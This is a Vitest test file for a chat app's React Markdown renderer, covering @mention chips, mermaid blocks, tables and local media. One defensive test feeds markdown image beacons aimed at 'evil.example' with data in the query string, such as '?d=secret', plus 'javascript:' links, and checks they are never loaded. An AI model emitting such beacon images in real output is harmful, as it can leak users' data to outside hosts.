import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import type { AgentConfig } from '../src/shared/types';
import { parseMentions } from '../src/server/prompt';
import { Markdown, findMentions, mermaidSource, tableCellClass, textWidthEm } from '../src/web/components/Markdown';
import { I18nProvider } from '../src/web/i18n';

const html = (text: string, mentions = ['Claude', 'Bob']) =>
  renderToStaticMarkup(createElement(I18nProvider, null, createElement(Markdown, { text, mentions })));
const chip = (name: string) => `<span class="mention">${name}</span>`;

describe('@mention chips', () => {
  it('highlights mentions in prose, but not in code or link text', () => {
    expect(html('ask @Claude and @bob, or @user')).toContain(`ask ${chip('@Claude')} and ${chip('@bob')}, or ${chip('@user')}`);
    expect(html('**@Claude** please')).toContain(`<strong>${chip('@Claude')}</strong>`);
    const out = html(
      [
        'Inline `ask @Claude` here.',
        '',
        '~~~',
        'ping @Claude',
        '~~~',
        '',
        '````',
        '```',
        '@Claude inside a longer fence',
        '````',
        '',
        '    @Claude in an indented block',
        '',
        '[ask @Claude](https://example.com)',
      ].join('\n'),
    );
    expect(out).not.toContain('class="mention"');
    expect(out).not.toContain('#mention');
    expect(out).toContain('<code>ask @Claude</code>');
    expect(out).toContain('>ask @Claude</a>');
  });

  it('follows the server rule for where a mention starts and ends', () => {
    const agents: AgentConfig[] = ['Bob', 'Bobby', '小明', 'Builder'].map((name) => ({ id: name, name, provider: 'claude', role: '' }));
    const names = agents.map((a) => a.name);
    const texts = [
      '@Builder請實作',
      '請 @小明檢查',
      '@Bobby and @Bob-x and @Bob.',
      'mail bob@Bob.com, a.@Bob, @@Bob',
      'x@Bob (@BOB) 「@Bob」',
      '@Bobbyx @Bob_ @Bob!',
    ];
    for (const text of texts) {
      const fromServer = parseMentions(text, agents).map((a) => a.name);
      const found = findMentions(text, names).map(({ start, end }) => text.slice(start + 1, end).toLowerCase());
      const chips = [...new Set(found)].map((n) => names.find((x) => x.toLowerCase() === n));
      expect(chips, text).toEqual(fromServer);
    }
    expect(html('@Builder請實作', ['Builder'])).toContain(`${chip('@Builder')}請實作`);
    expect(html('@Bobby', ['Bob'])).not.toContain('class="mention"');
  });
});

describe('chips and the server agree on Markdown structure', () => {
  const agents: AgentConfig[] = ['Claude', 'Builder', 'Bob'].map((name) => ({ id: name, name, provider: 'claude', role: '' }));
  const names = agents.map((a) => a.name);
  /** Names of the chips the UI renders, first appearance first. */
  const chips = (text: string) =>
    [...new Set([...html(text, names).matchAll(/<span class="mention">@([^<]+)<\/span>/g)].map((m) => m[1]!.toLowerCase()))].map(
      (n) => names.find((x) => x.toLowerCase() === n)!,
    );

  it('in links, URLs, code of every kind, quotes, lists and emphasis', () => {
    const texts = [
      '[ask @Claude](https://x.example) then @Bob',
      'see https://github.com/@Claude/x and mail bob@Builder.dev',
      '    @Claude in indented code\n\nthen @Bob',
      '> ```\n> @Claude\n> ```\n\n@Bob',
      '1. step\n\n       ```java\n       @Builder\n       ```\n\n2. @Bob',
      '`two-line\n@Claude code` and @Bob',
      '_@Claude_ and __@Bob__ and _note_@Builder',
      '@Builder請實作，@Claude 檢查',
      '```ts\nconst a = "@Builder";',
    ];
    for (const text of texts) expect(chips(text), text).toEqual(parseMentions(text, agents).map((a) => a.name));
    // A Java annotation in a code block inside a list does not hand the floor to @Builder.
    expect(parseMentions(texts[4]!, agents).map((a) => a.name)).toEqual(['Bob']);
  });
});

describe('images in agent output', () => {
  it('are links, never loaded', () => {
    const out = html('![tracker](https://evil.example/beacon.png?d=secret) and ![](https://evil.example/2.png)');
    expect(out).not.toContain('<img');
    expect(out).toContain('<a href="https://evil.example/beacon.png?d=secret" class="image-link" target="_blank" rel="noreferrer">tracker</a>');
    expect(out).toContain('>https://evil.example/2.png</a>');
    // Unsafe targets are still dropped.
    expect(html('[x](javascript:alert(1)) ![y](javascript:alert(2))')).not.toContain('javascript:');
  });

  it('covers reference images and images inside links, without nesting links', () => {
    const ref = html('![logo][l]\n\n[l]: https://evil.example/l.png');
    expect(ref).not.toContain('<img');
    expect(ref).toContain('href="https://evil.example/l.png"');
    const badge = html('[![build](https://evil.example/badge.svg)](https://ci.example)');
    expect(badge).not.toContain('<img');
    expect(badge).not.toContain('evil.example');
    expect(badge.match(/<a /g)).toHaveLength(1);
  });
});

describe('mermaid blocks', () => {
  it('are picked out by their language, with their source intact', () => {
    const pre = (className: string[], text: string) => ({
      type: 'element',
      tagName: 'pre',
      children: [{ type: 'element', tagName: 'code', properties: { className }, children: [{ type: 'text', value: text }] }],
    });
    expect(mermaidSource(pre(['language-mermaid'], 'flowchart TD\n  A --> B\n'))).toBe('flowchart TD\n  A --> B\n');
    expect(mermaidSource(pre(['hljs', 'language-mermaid'], 'graph LR'))).toBe('graph LR');
    expect(mermaidSource(pre(['language-ts'], 'const a = 1'))).toBeUndefined();
    expect(mermaidSource(undefined)).toBeUndefined();
  });

  it('show their source until the diagram is drawn, and leave other code blocks alone', () => {
    const out = html(['```mermaid', 'flowchart TD', '  A["a <b>b</b>"] --> B', '```', '', '```ts', 'const a = 1', '```'].join('\n'));
    expect(out).toContain('<div class="mermaid-block"><pre><code class="language-mermaid">flowchart TD\n  A[&quot;a &lt;b&gt;b&lt;/b&gt;&quot;] --&gt; B\n</code></pre></div>');
    expect(out).toContain('<pre><code class="hljs language-ts">');
  });
});

describe('tables', () => {
  it('measure text roughly: wide characters 1em, the rest about half', () => {
    expect(textWidthEm('結束條件')).toBe(4);
    expect(textWidthEm('Roundtable')).toBeCloseTo(5.5);
    expect(textWidthEm('最多 5 輪')).toBeCloseTo(3 + 3 * 0.55);
    expect(textWidthEm('')).toBe(0);
  });

  it('keep short cells on one line and let long ones wrap at a readable width', () => {
    for (const text of ['Roundtable', 'OK', '模式', '結束條件', '`Promise.allSettled`', ' 小表格 ']) expect(tableCellClass(text), text).toBe('one-line');
    for (const text of ['依隊伍順序一個接一個發言，後面的人看得到前面的發言', 'Speakers take turns in team order, each seeing earlier replies'])
      expect(tableCellClass(text), text).toBe('wrap');
  });

  it('mark each cell, and keep its alignment', () => {
    const out = html(['| 模式 | 排程 | OK |', '| --- | --- | :-: |', '| Roundtable | 依隊伍順序一個接一個發言，後面的人看得到前面的發言 | ✓ |'].join('\n'));
    expect(out).toContain('<th class="one-line">模式</th>');
    expect(out).toContain('<td class="one-line">Roundtable</td>');
    expect(out).toContain('<td class="wrap">依隊伍順序');
    expect(out).toContain('<th style="text-align:center" class="one-line">OK</th>');
  });
});

describe('images and videos from this computer', () => {
  const media = (text: string) =>
    renderToStaticMarkup(createElement(I18nProvider, null, createElement(Markdown, { text, mediaBase: '/api/conversations/c/messages/m/media' })));

  it('are shown through the app, while other sites stay links', () => {
    const out = media('Here: ![Sales](charts/sales.png) and ![remote](https://evil.example/x.png)');
    expect(out).toContain('<img class="chat-media" src="/api/conversations/c/messages/m/media?path=charts%2Fsales.png" alt="Sales"');
    expect(out).not.toContain('src="https://evil.example');
    expect(out).toContain('href="https://evil.example/x.png"');
    const video = media('![Demo](file:///Users/me/p/demo.mp4)');
    expect(video).toContain('<video class="chat-media" src="/api/conversations/c/messages/m/media?path=%2FUsers%2Fme%2Fp%2Fdemo.mp4"');
  });

  it('stay links without a media URL, inside links, and for other files', () => {
    expect(html('![Sales](charts/sales.png)')).not.toContain('<img');
    expect(media('[![Sales](charts/sales.png)](https://ci.example)')).not.toContain('<img');
    expect(media('![doc](docs/readme.md)')).not.toContain('<img');
  });
});
